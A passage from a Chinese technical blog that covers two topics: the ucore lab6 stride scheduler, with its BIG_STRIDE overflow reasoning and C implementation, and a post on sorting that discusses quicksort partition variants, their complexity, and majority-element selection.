<p>有效的BIG_STRIDE取值范围</p>
</blockquote>
<p>开始有A=B,最大步进S</p>
<ol>
<li>B+S不溢出则需$0$&lt;A&lt;B+S&lt;2^ 31​,比较粗略的范围，即0&lt;S&lt;​2^31</li>
<li>B+S溢出代表B+S&gt;=2^32</li>
</ol>
<p>溢出后B’=B+S-2^32</p>
<p>此时为使A-B’&lt;0,需要A&gt;=B’+2^31</p>
<p>即A&gt;=B+S-2^32+2^31=B+S-2^31</p>
<p>又由A=B</p>
<p>有0&gt;=S-2^31</p>
<p>即S&lt;=2^31</p>
<p>综合有S&lt;2^31</p>
<p>即S&lt;=0x7FFFFFFF</p>
<p>【约定】</p>
<ul>
<li>根据课上向老师的思路，我们可以将4字节的int简化为1字节来讨论。</li>
<li>考虑有A、B两个进程，其stride值分别记作<code>unsigned a,b</code>。</li>
<li>增量步长pass记作s。</li>
<li>stride值溢出，指的是无符号数的溢出，即a &gt;= 256。</li>
<li>“无符号数的有符号比较”这一技巧，下面简称“技巧”。它指的是(signed)(a-b)。</li>
</ul>
<p>【已知结论】</p>
<ul>
<li><p>结论1：“stride值不溢出且a,b相差不超过127时，技巧是合理的。”</p>
</li>
<li><p>结论2：“若进程A的stride值溢出，则应转而执行进程B。”</p>
</li>
<li><p>结论3：“s&lt;=255。”</p>
</li>
</ul>
<p>说明如下——</p>
<p>结论1：若a=1, b=2，则显然signed(a-b) = -1&lt;0合理；</p>
<p>若a=1, b=200，则signed(a-b) = signed(-199) = 57&gt;0不合理；</p>
<p>若a=127, b=255，则signed(a-b) = signed(-128) = -128&lt;0合理；</p>
<p>若a=255, b=127，则signed(a-b) = signed(128) = -128&lt;0不合理。</p>
<p>故a, b至多相差127。</p>
<p>结论2：这是合理的做法。</p>
<p>结论3：否则，若s=256，则有a+s = a，进程A将永远进行下去，不合理。</p>
<p>【stride值溢出时的情况分析】</p>
<p>根据结论2，我们的“技巧”应保证：</p>
<p>对于至多相差127的任意a, b，若①signed(a-b) &lt;= 0（说明当前A在运行），且②a + s &gt;= 256（A的stride溢出），则有signed(a + s - b) &gt; 0（则应转为B来运行）。</p>
<p>假设a&lt;=127，则由于结论3，溢出后的a + s &lt; a，signed(a-b) &lt; 0，不满足要求。</p>
<p>故128 &lt;= a &lt;= b &lt;= 255。</p>
<p>假设128 &lt;= s &lt;= 255，由于我们需要对任意满足条件的a, b都成立，故不妨取a = 255，b = 255，则signed(a + s - b) = signed(s) &lt; 0，不满足要求。</p>
<p>故s &lt;= 127。</p>
<p>因此，<strong>若进程A发生stride值溢出，则增加s之前的情形为，128 &lt;= a &lt;= b &lt;= 255。</strong></p>
<p><strong>当步长s &lt;= 127时，可以使得在溢出后，“技巧”仍能保证算法的正确性。</strong></p>
<p>【最终结论：最大步长限制】</p>
<p>结合结论1，我们得到了如下结论：</p>
<p><strong>当（任意进程的）步长s &lt;= 127时，“技巧”可以保证算法的正确性。（无论是否发生stride值溢出。）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIG_STRIDE    0x7FFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>具体比较函数实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">proc_stride_comp_f(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> =</span> le2proc(a, lab6_run_pool);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> =</span> le2proc(b, lab6_run_pool);</span><br><span class="line">     <span class="keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;</span><br><span class="line">     <span class="keyword">if</span> (c &gt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调度器中其余函数实现如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_init(struct run_queue *rq) &#123;</span><br><span class="line">     list_init(&amp;(rq-&gt;run_list));<span class="comment">//run_list供list操作使用</span></span><br><span class="line">     rq-&gt;lab6_run_pool = <span class="literal">NULL</span>;<span class="comment">//run_pool供skew_heap操作使用</span></span><br><span class="line">     rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP</span></span><br><span class="line">     rq-&gt;lab6_run_pool =</span><br><span class="line">          skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">     assert(list_empty(&amp;(proc-&gt;run_link)));<span class="comment">//确保不在run_list中</span></span><br><span class="line">     list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">     <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">          proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">     &#125;</span><br><span class="line">     proc-&gt;rq = rq;</span><br><span class="line">     rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP</span></span><br><span class="line">     rq-&gt;lab6_run_pool =</span><br><span class="line">          skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">     assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">     list_del_init(&amp;(proc-&gt;run_link));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">     rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">stride_pick_next</span>(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SKEW_HEAP</span></span><br><span class="line">     <span class="keyword">if</span> (rq-&gt;lab6_run_pool == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> =</span> le2proc(rq-&gt;lab6_run_pool, lab6_run_pool);</span><br><span class="line">     <span class="comment">//堆顶即为stride最小的进程</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">     <span class="keyword">if</span> (le == &amp;rq-&gt;run_list)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> =</span> le2proc(le, run_link);</span><br><span class="line">     le = list_next(le);</span><br><span class="line">     <span class="keyword">while</span> (le != &amp;rq-&gt;run_list)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> =</span> le2proc(le, run_link);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">int32_t</span>)(p-&gt;lab6_stride - q-&gt;lab6_stride) &gt; <span class="number">0</span>)</span><br><span class="line">               p = q;</span><br><span class="line">          le = list_next(le);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">     <span class="keyword">if</span> (p-&gt;lab6_priority == <span class="number">0</span>)</span><br><span class="line">          p-&gt;lab6_stride += BIG_STRIDE;</span><br><span class="line">     <span class="keyword">else</span> p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">     <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          proc-&gt;time_slice --;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">          proc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/algorithm/sorting/</url>
    <content><![CDATA[<p>此前我们涉及了诸多排序算法，针对向量和列表的起泡排序、归并排序以及选择排序等算法，基于散列的桶排序算法，借助堆的性质的就地堆排序算法。在此外，排序算法还有快速排序算法，希尔排序算法，其构思和技巧各具特色，在不同应用中的效率也各有千秋。</p>
<a id="more"></a>

<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p>与归并排序一样，快速排序也是分治策略的典型应用，但二者有本质的区别，归并排序的计算量主要消耗于有序向量的归并操作，而子向量的划分却几乎不费时间。快速排序相反，可以在$O(1)$时间内由子问题的解得到原问题的解，但为了将原问题划分为两个子问题却需要$O(n)$时间。</p>
<h2 id="轴点"><a href="#轴点" class="headerlink" title="轴点"></a>轴点</h2><p>考查任一向量区间$S[lo,hi)$。对于任何$lo \leq mi&lt;hi$,以元素S[mi]为界限，都可分割出前、后两个子向量$S[lo,mi)$和$S(mi,hi)$。若$S[lo,mi)$中的元素均不大于$S[mi]$,且$S(mi,hi)$中的元素均不小于$S[mi]$，则元素$S[mi]$称作向量$S$的一个轴点。</p>
<p>以轴点$S[mi]$为界，前后向量的排序各自可独立进行，一旦前后向量各自完成排序，则可立即在常数时间内得到整个向量的排序结果。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//向量快速排序</span></span><br><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::quickSort ( Rank lo, Rank hi ) &#123; <span class="comment">//0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">   <span class="keyword">if</span> ( hi - lo &lt; <span class="number">2</span> ) <span class="keyword">return</span>; <span class="comment">//单元素区间自然有序，否则...</span></span><br><span class="line">   Rank mi = partition ( lo, hi - <span class="number">1</span> ); <span class="comment">//在[lo, hi - 1]内构造轴点</span></span><br><span class="line">   quickSort ( lo, mi ); <span class="comment">//对前缀递归排序</span></span><br><span class="line">   quickSort ( mi + <span class="number">1</span>, hi ); <span class="comment">//对后缀递归排序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在原始序列中轴点未必存在，任何一个元素作为轴点的必要条件是在初始向量和排序后向量中的秩应相等。只要所有元素都是错位的，则任何元素都不可能是轴点。但是可通过交换使任一元素转换为轴点。</p>
<p><img src="https://i.loli.net/2019/09/12/WmFryYfD16gpUuk.png"></p>
<p>任取一候选者，前缀$L$小于等于候选者，初始时为空，后缀$G$大于等于候选者，初始为空，中间区域待确定，初始为全集。交替向内移动$lo$和$hi$，逐个检查当前元素，若更小/大，则转移归入$L/G$。当$lo=hi$时，只需将候选者嵌入$L$、$G$之间，即为轴点。整个过程中，每个元素最多移动一次(候选者两次)，累计$O(n)$时间，$O(1)$辅助空间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//轴点构造算法：通过调整元素位置构造区间[lo, hi]的轴点，并返回其秩</span></span><br><span class="line">Rank Vector&lt;T&gt;::partition ( Rank lo, Rank hi ) &#123; <span class="comment">//版本B：可优化处理多个关键码雷同的退化情况</span></span><br><span class="line">   swap ( _elem[lo], _elem[lo + rand() % ( hi - lo + <span class="number">1</span> ) ] ); <span class="comment">//任选一个元素与首元素交换</span></span><br><span class="line">   T pivot = _elem[lo]; <span class="comment">//以首元素为候选轴点——经以上交换，等效于随机选取</span></span><br><span class="line">   <span class="keyword">while</span> ( lo &lt; hi ) &#123; <span class="comment">//从向量的两端交替地向中间扫描</span></span><br><span class="line">      <span class="keyword">while</span> ( lo &lt; hi )</span><br><span class="line">         <span class="keyword">if</span> ( pivot &lt; _elem[hi] ) <span class="comment">//在大于pivot的前提下</span></span><br><span class="line">            hi--; <span class="comment">//向左拓展右端子向量</span></span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//直至遇到不大于pivot者</span></span><br><span class="line">            &#123; _elem[lo++] = _elem[hi]; <span class="keyword">break</span>; &#125; <span class="comment">//将其归入左端子向量</span></span><br><span class="line">      <span class="keyword">while</span> ( lo &lt; hi )</span><br><span class="line">         <span class="keyword">if</span> ( _elem[lo] &lt; pivot ) <span class="comment">//在小于pivot的前提下</span></span><br><span class="line">            lo++; <span class="comment">//向右拓展左端子向量</span></span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//直至遇到不小于pivot者</span></span><br><span class="line">            &#123; _elem[hi--] = _elem[lo]; <span class="keyword">break</span>; &#125; <span class="comment">//将其归入右端子向量</span></span><br><span class="line">   &#125; <span class="comment">//assert: lo == hi</span></span><br><span class="line">   _elem[lo] = pivot; <span class="comment">//将备份的轴点记录置于前、后子向量之间</span></span><br><span class="line">   <span class="keyword">return</span> lo; <span class="comment">//返回轴点的秩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><p>为不稳定算法，$lo/hi$的移动方向相反，左/右侧的大/小重复元素可能前后颠倒。同时为就地算法，只需$O(1)$附加空间。递归实例在最坏情况下需要$\Omega(n)$空间。</p>
<p><code>partition</code>算法可在线性时间内将原向量分解为两个相互独立、总体规模保持线性的子向量排序问题，根据轴点的性质，由排序后的向量可在常数时间内得到整个有序向量。分治策略高效实现的两个必要条件满足，即子问题划分的高效性和子问题相互之间的独立性，但是子任务规模相近在此处却无法保证。<br><code>partition</code>算法划分所得子序列长度与划分的具体过程无关，完全取决于入口处所选的轴点。若在最终有序向量中该候选元素的秩为$r$，则子向量的规模必然为$r$和$n-r-1$。</p>
<p>最好情况：每次划分都接近平均，轴点总是接近中央。</p>
<p>$\displaystyle T(n)=2T(\frac{n-1}{2})+O(n)=O(nlogn)$</p>
<p>最坏情况：每次划分都极不均衡</p>
<p>$T(n)=T(n-1)+T(0)+O(n)=O(n^2)$</p>
<p>可以通过随即选取一个候选轴点，或者从待排序向量中任取三个元素，将其数值居中者作为候选者，来降低最坏情况出现的概率，但是无法杜绝最坏情况的概率。</p>
<p>以下分析平均效率</p>
<p>准居中：<code>pivot</code>的秩落在宽度为$\lambda n$的居中区间，每以递归路径上，至多出现$log_{\frac{2}{1+\lambda} n}$ 个准居中的轴点。</p>
<p>每递归一层，都有$\lambda|(1-\lambda)$的概率准居中|准侧偏</p>
<p>深入$\displaystyle \frac{1}{\lambda}log_{\frac{2}{1+\lambda} n}$ 层后，即可期望出现$\displaystyle log_{\frac{2}{1+\lambda}} n$次居中，且有极高的概率出现，因此有极高的概率递归深度不超过$\displaystyle \frac{1}{\lambda}log_{\frac{2}{1+\lambda} n}=3log_{3/2} n$</p>
<p>假设待排序的元素都符合独立均匀分布，<code>partition</code>算法经过$n-1$次比较和$n+1$次移动之后，对规模为$n$的向量划分结果无非两种可能，划分所分左侧子序列的长度分别是$0,1,..,n-1$次，分别决定于所取元素在候选节点在最终有序序列中的秩。</p>
<p>$\displaystyle T(n)=(n+1)+\frac{1}{n} \sum_{k=0}^{n-1}[T(k)+T(n-k-1)]$</p>
<p>$\displaystyle =(n+1)+\frac{2}{n} \sum_{k=0}^{n-1}T(k)$</p>
<p>等式两侧同时乘以$n$，则有：</p>
<p>$nT(n)=n(n+1)+2\sum_{k=0}^{n-1}T(k)$</p>
<p>$(n-1)T(n-1)=(n-1)+2\sum_{k=0}^{n-2}T(k)$</p>
<p>两式相减，得$nT(n)-(n-1)T(n-1)=2n+2T(n-1)$</p>
<p>$nT(n)=2n+(n+1)T(n-1)$</p>
<p>两边同时除以$n(n+1)$,得</p>
<p>$T(n)/(n+1)=2/(n+1)+T(n-1)/n$</p>
<p>$=2/(n+1)+2/n+T(n-2)/(n-1)$</p>
<p>$=2/(n+1)+2/n+2/(n-1)+…2/2+T(0)/1$</p>
<p>$&lt;2lnn$</p>
<p>$T(n) \approx 2nlnn=(2ln2)nlogn  \approx 1.386logn=O(nlogn)$</p>
<h2 id="退化情况"><a href="#退化情况" class="headerlink" title="退化情况"></a>退化情况</h2><p>考查所有元素均退化的情况，主循环内部前一子循环的条件<code>pivot&lt;=_elem[hi]</code> 形同虚设，此时，划分的结果必然是以最左端为轴点，原向量划分为极不对称的两个子向量，这一最坏情况还可能持续发生，从而使整个算法过程等效地退化为线性递归，递归深度为$O(n)$，导致总体运行时间高达$O(n^2)$。</p>
<p>可以再每次深入递归时统一核验，若确为退化情况，则无需递归而直接返回，但在重复元素不多时，如此会增加额外的计算量，总体权衡后得不偿失。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//轴点构造算法：通过调整元素位置构造区间[lo, hi]的轴点，并返回其秩</span></span><br><span class="line">Rank Vector&lt;T&gt;::partition ( Rank lo, Rank hi ) &#123; <span class="comment">//版本B1：版本B的等价形式，可直接转至与版本A等价的版本A1</span></span><br><span class="line">   swap ( _elem[lo], _elem[lo + rand() % ( hi-lo+<span class="number">1</span> ) ] ); <span class="comment">//任选一个元素与首元素交换</span></span><br><span class="line">   T pivot = _elem[lo]; <span class="comment">//以首元素为候选轴点——经以上交换，等效于随机选取</span></span><br><span class="line">   <span class="keyword">while</span> ( lo &lt; hi ) &#123; <span class="comment">//从向量的两端交替地向中间扫描</span></span><br><span class="line">      <span class="keyword">while</span> ( ( lo &lt; hi ) &amp;&amp; ( pivot &lt; _elem[hi] ) ) <span class="comment">//在大于pivot的前提下</span></span><br><span class="line">         hi--; <span class="comment">//向左拓展右端子向量</span></span><br><span class="line">      <span class="keyword">if</span> ( lo &lt; hi ) _elem[lo++] = _elem[hi]; <span class="comment">//不大xia于pivot者归入左端子向量</span></span><br><span class="line">      <span class="keyword">while</span> ( ( lo &lt; hi ) &amp;&amp; ( _elem[lo] &lt; pivot ) ) <span class="comment">//在小于pivot的前提下</span></span><br><span class="line">         lo++; <span class="comment">//向右拓展左端子向量</span></span><br><span class="line">      <span class="keyword">if</span> ( lo &lt; hi ) _elem[hi--] = _elem[lo]; <span class="comment">//不小于pivot者归入右端子向量</span></span><br><span class="line">   &#125; <span class="comment">//assert: lo == hi</span></span><br><span class="line">   _elem[lo] = pivot; <span class="comment">//将备份的轴点记录置于前、后子向量之间</span></span><br><span class="line">   <span class="keyword">return</span> lo; <span class="comment">//返回轴点的秩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与版本A比较，版本B主要是调整了两个内循环的终止条件。将原条件<code>pivot&lt;=elem[hi]</code>更改<code>pivot&lt;elem[hi]</code>,一旦遇到重复元素，右端子向量随即终止拓展，并将右端重复元素移至左端，lo和hi会交替移动，二者移动距离大致相当。但是以上改进需做更多的交换操作，倾向于交换重复元素，所以重复元素在原输入向量中的相对次序更难保持。</p>
<p>构造轴点的另一快捷思路：</p>
<p>始终将整个向量划分为四个区间，$v[lo],L=v(lo,mi],G=v(mi,k],u=v[k,hi]$</p>
<p>其中$v[lo]$为候选轴点，$L/G$中的元素均不大/不小于$v[lo]$，$U$中元素大小未知。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//轴点构造算法：通过调整元素位置构造区间[lo, hi]的轴点，并返回其秩</span></span><br><span class="line">Rank Vector&lt;T&gt;::partition ( Rank lo, Rank hi ) &#123; <span class="comment">//版本C</span></span><br><span class="line">   swap ( _elem[lo], _elem[lo + rand() % ( hi - lo + <span class="number">1</span> ) ] ); <span class="comment">//任选一个元素与首元素交换</span></span><br><span class="line">   T pivot = _elem[lo]; <span class="comment">//以首元素为候选轴点——经以上交换，等效于随机选取</span></span><br><span class="line">   <span class="keyword">int</span> mi = lo;</span><br><span class="line">   <span class="comment">//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">   <span class="comment">//   [ ---- &lt; [lo] ----- ] [ ----- [lo] &lt;= --- ] [ ----- unknown ----- ]</span></span><br><span class="line">   <span class="comment">// X x . . . . . . . . . x . . . . . . . . . . . x . . . . . . . . . . x</span></span><br><span class="line">   <span class="comment">// |                     |                       |                     |</span></span><br><span class="line">   <span class="comment">// lo (pivot)            mi                      k                     hi</span></span><br><span class="line">   <span class="comment">//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> k = lo + <span class="number">1</span>; k &lt;= hi; k++ ) <span class="comment">//自左向右扫描</span></span><br><span class="line">      <span class="keyword">if</span> ( _elem[k] &lt; pivot ) <span class="comment">//若当前元素_elem[k]小于pivot，则</span></span><br><span class="line">         swap ( _elem[++mi], _elem[k] ); <span class="comment">//将_elem[k]交换至原mi之后，使L子序列向右扩展</span></span><br><span class="line">   <span class="comment">//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">   <span class="comment">//   [ --------- &lt; [lo] ---------- ] [ ----------- [lo] &lt;= ----------- ]</span></span><br><span class="line">   <span class="comment">// X x . . . . . . . . . . . . . . x . . . . . . . . . . . . . . . . . x</span></span><br><span class="line">   <span class="comment">// |                               |                                   |</span></span><br><span class="line">   <span class="comment">// lo                              mi                                  hi</span></span><br><span class="line">   <span class="comment">//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">   swap ( _elem[lo], _elem[mi] ); <span class="comment">//候选轴点归位</span></span><br><span class="line">   <span class="keyword">return</span> mi; <span class="comment">//返回轴点的秩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始时取$k-1=mi=lo$,$L$和$G$均为空，此后随着$k$不断递增，逐一检查元素$v[k]$，并根据$v[k]$相对于候选轴点的大小，相应地扩展区间$L$或区间$G$，同时压缩区间$U$。最终，当$k-1=hi$时，$U$中不含任何元素，于是只需将候选轴点放至$V[mi]$，即成为真正的轴点。</p>
<p>基于以上实现的快速排序算法不稳定，子向量L和R都是向右侧延伸，新元素都是插至向量的末尾。除此以外，子向量$L$不会有任何修改，故其中所有元素之间的相对次序必然与原向量一致。然而，在子向量$L$的每次生长之前，子向量$R$都需要相应地向前滚动一个单元，故可能造成雷同元素之间相同次序的紊乱。在元素大量甚至完全重复的情况下该算法虽不致出错，但划分所得的子向量的规模相差悬殊，几乎退化成起泡排序算法，整体运行时间将增加到$O(n^2)$。</p>
<h1 id="选取与中位数"><a href="#选取与中位数" class="headerlink" title="选取与中位数"></a>选取与中位数</h1><p><strong>k选取</strong></p>
<p>在任意一组可比较大小的元素中，如何从小到大找出其中次序为$k$者？亦即在这组元素的非降排序序列$S$中找出$S[k]$。</p>
<p><strong>中位数</strong></p>
<p>长度为$n$的有序序列中，元素$S[n/2]$称作中位数(数值上可能有重复)。在任意一组可比较大小的元素中，如何找到中位数？</p>
<p>中位数是$k$选取问题的一个特例，也是其中难度最大者。由于中位数可将原数据集划分为大小明确、规模相仿且彼此独立的两个子集，故能否高效地确定中位数将直接关系到分治策略可否高效实现。</p>
<h2 id="蛮力算法"><a href="#蛮力算法" class="headerlink" title="蛮力算法"></a>蛮力算法</h2><p>由中位数的定义，可直接得到查找中位数的算法如下：对所有元素排序，将其转化为有序序列S，则$S[n/2]$即为所要找的中位数。对无序向量的排序在最坏情况下需要$\Omega(nlogn)$时间，故基于该算法的任何分治算法，时间复杂度都不会低于$T(n)=nlogn+2T(n/2)=O(nlog^2n)$</p>
<blockquote>
<p>不妨考虑中位数问题的一个简化版，在任一无序向量A中，若有一半元素的数值同为$m$,则将$m$称为A的众数。那么，任给无序向量，如何快速判断其中是否存在众数，并在存在时将其找出？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">bool</span> <span class="title">majority</span> <span class="params">( Vector&lt;T&gt; A, T&amp; maj )</span> </span>&#123; <span class="comment">//众数查找算法：T可比较可判等</span></span><br><span class="line">   maj = majEleCandidate ( A ); <span class="comment">//必要性：选出候选者maj</span></span><br><span class="line">   <span class="keyword">return</span> majEleCheck ( A, maj ); <span class="comment">//充分性：验证maj是否的确当选</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过调用<code>majEleCandidate()</code> ,从向量A中找到中位数maj，并将其作为众数唯一候选者。再调用<code>majEleCheck()</code></p>
<p>在线性时间内扫描一遍向量，从而最终判断向量A的众数是否的确存在。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">bool</span> <span class="title">majEleCheck</span> <span class="params">( Vector&lt;T&gt; A, T maj )</span> </span>&#123; <span class="comment">//验证候选者是否确为众数</span></span><br><span class="line">   <span class="keyword">int</span> occurrence = <span class="number">0</span>; <span class="comment">//maj在A[]中出现的次数</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.size(); i++ ) <span class="comment">//逐一遍历A[]的各个元素</span></span><br><span class="line">      <span class="keyword">if</span> ( A[i] == maj ) occurrence++; <span class="comment">//每遇到一次maj，均更新计数器</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">2</span> * occurrence &gt; A.size(); <span class="comment">//根据最终的计数值，即可判断是否的确当选</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设$P$为向量A中长度为$2m$的前缀，若元素$x$在P中恰好出现$m$次，则$A$有众数当且仅当后缀$A-P$有众数，同时$A-P$的众数就是$A$的众数。</p>
<p>若$A$的众数就是$x$,则在剪除前缀$P$之后，$x$与非众数均减少相同的数目，二者数目的差距在后缀$A-P$中保持不变。反过来，若$A-P$的众数不为$x$，则二者数目的差距在后缀$A-P$中也不会缩小。</p>
<p>按照以上减而治之策略，可唯一确定众数的候选者。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function">T <span class="title">majEleCandidate</span> <span class="params">( Vector&lt;T&gt; A )</span> </span>&#123; <span class="comment">//选出具备必要条件的众数候选者</span></span><br><span class="line">   T maj; <span class="comment">//众数候选者</span></span><br><span class="line"><span class="comment">// 线性扫描：借助计数器c，记录maj与其它元素的数量差额</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> c = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; A.size(); i++ )</span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> == c ) &#123; <span class="comment">//每当c归零，都意味着此时的前缀P可以剪除</span></span><br><span class="line">         maj = A[i]; c = <span class="number">1</span>; <span class="comment">//众数候选者改为新的当前元素</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//否则</span></span><br><span class="line">         maj == A[i] ? c++ : c--; <span class="comment">//相应地更新差额计数器</span></span><br><span class="line">   <span class="keyword">return</span> maj; <span class="comment">//至此，原向量的众数若存在，则只能是maj —— 尽管反之不然</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，变量<code>maj</code>始终为当前前缀中出现次数不少于一半的某个元素，c始终记录该元素与其他元素的数目之差。一旦c归零，则意味着在当前向量找到了一个可以减除的前缀$P$。在剪除该前缀后，问题范围将响应地缩小至$A-P$。此后，只需将<code>maj</code>重新初始化为$A-P$的首元素，并令<code>c=1</code>,即可继续重复上述迭代过程。</p>
<p>对于向量的每个秩，该算法迭代且仅迭代一步。故其运行时间，应线性正比于向量规模。</p>
<p>该候选者未必是众数，但也未必是原向量中出现最频繁者。该算法采取简而治之的策略，原向量等效地切分为若干区段，各区段首元素至少在其中占一半的比例。因此，最后返回的<code>maj</code>，实际上只是最后一个区段的准众数，未必就是整个向量的准众数。</p>
<p>若众数的定义修改为众数应严格地不少于其他元素，则需要对之前算法进行一定改进。</p>
